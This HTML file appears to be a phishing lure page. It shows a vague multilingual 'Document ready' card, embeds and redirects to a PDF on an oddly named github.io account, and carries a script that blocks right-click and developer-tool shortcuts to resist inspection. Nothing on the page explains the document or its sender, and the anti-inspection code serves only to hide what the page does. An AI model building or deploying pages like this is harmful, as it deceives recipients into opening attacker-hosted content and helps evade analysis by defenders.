<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Opening Document</title>

<style>
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:Arial, sans-serif;
    background:#0b1c2d;
    color:#111;
  }

  .card{
    background:#ffffff;
    width:95%;
    max-width:700px;
    padding:28px;
    border-radius:14px;
    box-shadow:0 18px 40px rgba(0,0,0,.25);
    text-align:left; /* align text to left */
  }

  .icon{
    font-size:38px;
    margin-bottom:14px;
  }

  h1{
    font-size:20px;
    margin:0 0 8px;
    font-weight:600;
  }

  p{
    font-size:14px;
    color:#555;
    margin:0 0 20px;
    line-height:1.5;
  }

  .btn{
    display:inline-block;
    background:#2563eb;
    color:#fff;
    padding:12px 26px;
    font-size:14px;
    border-radius:6px;
    text-decoration:none;
    cursor:pointer;
    margin-top:12px;
    min-width:160px;
    text-align:center;
  }

  .btn:hover{
    background:#1e4fd6;
  }

  /* PDF iframe styling */
  .pdf-iframe {
    width: 100%;
    height: 200px; /* landscape feel */
    border: 1px solid #ccc;
    border-radius: 8px;
    margin-bottom: 16px;
  }

  @media (min-width: 768px) {
    .pdf-iframe {
      height: 240px;
    }
  }

  @media (min-width: 1200px) {
    .pdf-iframe {
      height: 280px;
    }
  }

  /* smaller note text */
  .note {
    font-size:11px; 
    color:#6b7280; 
    margin:16px 0 0;
  }
</style>
</head>

<body>

<div class="card">
  <div class="icon">✉️</div>

  <h1 id="title"></h1>
  <p id="message"></p>

  <!-- PDF iframe -->
  <iframe class="pdf-iframe"
          src="https://dasmineencounterrealty.github.io/expert-octo-waddle/Terra Mark.pdf"
          loading="lazy">
  </iframe>

  <a id="goBtn" class="btn"></a>

  <p class="note">
    If you do not expect this notification, no action is required.
  </p>
</div>

<script>
const DESTINATION_URL = "https://dasmineencounterrealty.github.io/expert-octo-waddle/Terra Mark.pdf";

const lang = (navigator.language || "en").slice(0,2);

const copy = {
  en:{
    title:"Document ready",
    message:"Review the information below to continue.",
    button:"Open document"
  },
  fr:{
    title:"Document prêt",
    message:"Veuillez examiner les informations ci-dessous pour continuer.",
    button:"Ouvrir le document"
  },
  es:{
    title:"Documento listo",
    message:"Revise la información a continuación para continuar.",
    button:"Abrir documento"
  }
};

const t = copy[lang] || copy.en;

document.getElementById("title").textContent = t.title;
document.getElementById("message").textContent = t.message;
document.getElementById("goBtn").textContent = t.button;

/* Button opens PDF in same tab */
document.getElementById("goBtn").addEventListener("click", () => {
  window.location.href = DESTINATION_URL;
});

/* Light DevTools deterrent */
document.addEventListener("contextmenu", e => e.preventDefault());
document.addEventListener("keydown", e => {
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())) ||
    (e.ctrlKey && e.key.toUpperCase() === "U")
  ) {
    e.preventDefault();
  }
});
</script>

</body>
</html>
